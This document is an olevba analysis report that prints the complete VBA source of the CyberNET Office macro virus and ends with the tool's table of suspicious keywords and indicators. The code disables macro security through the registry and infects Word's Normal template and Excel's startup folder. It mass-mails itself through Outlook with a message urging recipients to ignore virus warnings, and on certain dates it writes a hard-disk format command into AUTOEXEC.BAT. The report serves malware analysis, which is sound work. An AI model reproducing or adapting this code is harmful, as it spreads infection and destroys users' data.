olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Cybernet-f9edbd63cb58effc52506a7d756c11e4e3552092
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Cybernet-f9edbd63cb58effc52506a7d756c11e4e3552092 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
'W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!"
Application.EnableCancelKey = wdCancelDisabled: Options.SaveInterval = 1: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Application.DisplayRecentFiles = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else: Options.VirusProtection _
= False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: End If
Call GP1055
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
Randomize: For QF7352 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next QF7352
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Call HG3579: End If
MB7293 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
HT202 = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.Description <> "CyberNET" Or Left(ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set RN8755 = ActiveDocument.VBProject.VBComponents
Call KP6522(RN8755)
RN8755(1).CodeModule. _
AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, HT202 - 19))
ActiveDocument.VBProject.Description = "CyberNET"
End If
If NormalTemplate.VBProject.Description <> "CyberNET" Or Left(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set RN8755 = NormalTemplate.VBProject.VBComponents
Call KP6522(RN8755)
Randomize
Dim FB4323(1 To 37) As String
FB4323(1) = "PG353"
FB4323(2) = "PV8948"
FB4323(3) = "MO4724"
FB4323(4) = "BE1547"
FB4323(5) = "QC586"
FB4323(6) = "MB7293"
FB4323(7) = "HT202"
FB4323(8) = "RN8755"
FB4323(9) = "SV6656"
FB4323(10) = "SA6469"
FB4323(11) = "MT3412"
FB4323(12) = "UA3493"
FB4323(13) = "GP1055"
FB4323(14) = "VJ455"
FB4323(15) = "QA8567"
FB4323(16) = "VN95"
FB4323(17) = "TE9976"
FB4323(18) = "PB5760"
FB4323(19) = "OU945"
FB4323(20) = "TS8760"
FB4323(21) = "KP6522"
FB4323(22) = "AV1314"
FB4323(23) = "JJ789"
FB4323(24) = "QF7352"
FB4323(25) = "FP6716"
FB4323(26) = "EJ8475"
FB4323(27) = "HN937"
FB4323(28) = "ST911"
FB4323(29) = "OU8710"
FB4323(30) = "PV1223"
FB4323(31) = "UR5071"
FB4323(32) = "UR9551"
FB4323(33) = "HG3579"
FB4323(34) = "GI6166"
FB4323(35) = "VO9720"
FB4323(36) = "QJ6170"
FB4323(37) = _
"FB4323"
For UA3493 = 1 To 37
SV6656 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call QC586(SV6656, FB4323(UA3493))
Next UA3493
ActiveDocument.Saved = True
RN8755(1).CodeModule. _
AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, MB7293 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & _
"If Dialogs(80).Show <> 0 Then Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub")
RN8755(1).Name = "HN937"
NormalTemplate.VBProject.Description = "CyberNET"
End If
Set ST911 = CreateObject("Excel.Application")
If UCase(Dir(ST911.Application.StartupPath + "\CyberNET.xls")) <> UCase("CYBERNET.XLS") Or Day(Now) = Minute(Now) Then
If UCase(Dir(ST911.Application.StartupPath + "\CyberNET.xls")) = UCase("CYBERNET.XLS") Then _
SetAttr (ST911.Application.StartupPath + "\CyberNET.xls"), vbArchive
If Dir(ST911.Application.StartupPath + "\*.xl?") <> "" Then _
Kill (ST911.Application.StartupPath + "\*.xl?")
Set OU8710 = ST911.Workbooks.Add
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 18)
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 151, "Attachments.Add ActiveWorkbook.FullName"
OU8710.SaveAs ST911.Application.StartupPath & "\CyberNET.xls"
ST911.ActiveWorkbook.VBProject.Description = "CyberNET"
ST911.ActiveWindow.Visible = False
ST911.Workbooks("CyberNET.xls").Save
ST911.Quit
SetAttr (ST911.Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
If HT202 <> 0 And MB7293 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function QC586(MT3412, SA6469 As String)
On Error Resume Next
Dim PG353 As Long: Dim PV8948 As Long: Dim MO4724 As Long: Dim BE1547 As Long
With ActiveDocument.VBProject.VBComponents(1).CodeModule
PG353 = 1: PV8948 = 1: MO4724 = .CountOfLines: BE1547 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SA6469, PG353, PV8948, MO4724, BE1547, True)
QJ6170 = .Lines(PG353, 1)
QJ6170 = _
Left(QJ6170, PV8948 - 1) & MT3412 & _
Mid(QJ6170, BE1547)
.ReplaceLine PG353, QJ6170
PG353 = MO4724 + 1: PV8948 = 1
MO4724 = .CountOfLines
BE1547 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function KP6522(RN8755)
Dim AV1314 As Object
For Each AV1314 In RN8755
AV1314.CodeModule.DeleteLines 1, _
AV1314.CodeModule.CountOfLines
Next AV1314
End Function
Private Function GP1055()
On Error Resume Next
Dim VN95, TE9976, PB5760
Set VN95 = CreateObject("Outlook.Application")
Set TE9976 = VN95.GetNameSpace("MAPI")
If GetSetting("Office", "CyberNET", "CyberNET") <> "(C)2000 - Indonesia By AnomOke!" Then
If VN95 = "Outlook" Then
TE9976.Logon "profile", "password"
For VJ455 = 1 To TE9976.AddressLists. _
Count 'anti-heuristic for stupid Norton antivirus scanner
Set EJ8475 = TE9976.AddressLists(VJ455)
JJ789 = 1
Set PB5760 = VN95.CreateItem(0)
For QA8567 = 1 To EJ8475.AddressEntries.Count
FP6716 = EJ8475.AddressEntries(JJ789)
PB5760.Recipients.Add FP6716
JJ789 = _
JJ789 + 1
If JJ789 > 50 Then QA8567 = EJ8475.AddressEntries.Count
Next QA8567
PB5760.Subject = "You've GOT Mail !!!"
PB5760.Body = "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
PB5760. _
Attachments.Add ActiveWorkbook.FullName
PB5760. _
Send 'anti-heuristic for stupid McAfee antivirus scanner
FP6716 = ""
Next VJ455
TE9976.Logoff
End If
SaveSetting "Office", "CyberNET", "CyberNET", "(C)2000 - Indonesia By AnomOke!"
End If
End Function
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
For VO9720 = 1 To 30
GI6166 = (Chr(65 + Int(Rnd * 12))) & VO9720
Range(GI6166).AddComment
Range(GI6166).Comment.Visible = True
Range(GI6166).Comment.Text Text:="(C)2000 - CyberNET From Indonesia"
Range(GI6166).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300): Next VO9720
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName: Call HG3579: End If
Set PV1223 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Or Day(Now) = Minute(Now) Then
Set UR5071 = GetObject(, "Word.Application")
If UR5071 = "" Then
Set UR5071 = CreateObject("Word.Application")
UR9551 = True
End If
If Dir(Application.TemplatesPath + "\Normal.dot") <> "" Then Kill (Application.TemplatesPath + "\Normal.dot")
If Dir(UR5071.Application.StartupPath + "\*.do?") <> "" Then _
Kill (UR5071.Application.StartupPath + "\*.do?")
Set RN8755 = UR5071.NormalTemplate.VBProject.VBComponents
UR5071.Options.SaveNormalPrompt = False
RN8755(1).CodeModule.InsertLines 1, "Public Sub HN937()" & vbCr & PV1223.Lines(5, 4) & vbCr & "End Sub"
UR5071.Run "Normal.ThisDocument.HN937"
Call KP6522(RN8755)
RN8755(1).CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & "If Dialogs(80).Show <> 0 Then Call Document_Close" _
& vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub"
UR5071.NormalTemplate.VBProject.Description = "CyberNET"
RN8755(1).Name = "HN937"
RN8755(1).CodeModule.ReplaceLine 151, "Attachments.Add ActiveDocument.FullName"
Set RN8755 = Nothing
If UR9551 = True Then UR5071.Quit
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Then
Set ST911 = CreateObject("Excel.Application")
Set OU8710 = ST911.Workbooks.Add
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1)
OU8710.SaveAs FileName:=Application.StartupPath & "\CyberNET.xls", FileFormat:=xlNormal, AddToMru:=False
ST911.ActiveWorkbook.VBProject.Description = "CyberNET"
ST911.ActiveWindow.Visible = False
ST911.Workbooks("CyberNET.xls").Save
ST911.Quit
SetAttr (Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
End If
If Left(ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Or ActiveWorkbook.VBProject.Description <> "CyberNET" Then
Set RN8755 = ActiveWorkbook.VBProject.VBComponents
Call KP6522(RN8755)
ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1)
ActiveWorkbook.VBProject.Description = "CyberNET"
End If
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("Window").Controls("Unhide...").Enabled = False
If UCase(Dir("C:\CyberNET.reg")) <> "CYBERNET.REG" Then
If Application.Version <> "9.0" Then
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close #1
Else
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
End If
End If
Shell "Regedit.exe /S C:\CyberNET.reg", vbHide
Call GP1055
Application.OnSheetActivate = "ThisWorkbook.Workbook_Deactivate"
End Sub
Private Function HG3579()
On Error Resume Next
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@ECHO OFF"
Print #1, "ECHO ###############################################################################"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
Print #1, "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
Print #1, "ECHO #                     Brought To You From INDONESIA...                        #"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO ###############################################################################"
Print #1, "CTTY NUL"
Print #1, "FORMAT C: /AUTOTEST /Q /U"
Close #1
Open ("C:\CONFIG.SYS") For Output As #2
Print #2, "SWITCHES=/N"
Print #2, "BREAK=OFF"
Close #2
MsgBox "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..." & Chr(13) & "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!" & vbCr & "Now...I Am Outta Here...", vbCritical + vbOKOnly, "(C)2000 - CyberNET"
Shell ("RUNDLL.EXE user.exe,exitwindows"), vbHide
End Function







-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Cybernet-f9edbd63cb58effc52506a7d756c11e4e3552092 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Cybernet-f9edbd63cb58effc52506a7d756c11e4e3552092 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Cybernet-f9edbd63cb58effc52506a7d756c11e4e3552092 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |CyberNET.reg        |Executable file name                         |
|IOC       |CYBERNET.REG        |Executable file name                         |
|IOC       |Regedit.exe         |Executable file name                         |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

